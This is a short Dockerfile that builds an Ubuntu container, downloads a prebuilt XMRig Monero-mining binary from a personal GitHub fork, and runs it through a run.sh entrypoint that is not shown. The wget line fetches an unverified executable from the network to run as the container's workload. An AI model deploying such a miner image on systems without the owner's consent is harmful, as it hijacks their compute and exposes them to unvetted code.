from ubuntu:xenial
COPY run.sh /
RUN adduser --system --disabled-password --home /ubuntu ubuntu && \
    apt-get update -y && \
    apt-get install -y wget libcurl4-openssl-dev libuv1 && \
    wget -O /app https://github.com/leonzdev/xmrig/releases/download/leonzdev_0.0.3/xmrig && \
    chmod a+x /app && \
    chmod a+x /run.sh
USER ubuntu 
ENTRYPOINT ["/run.sh"]

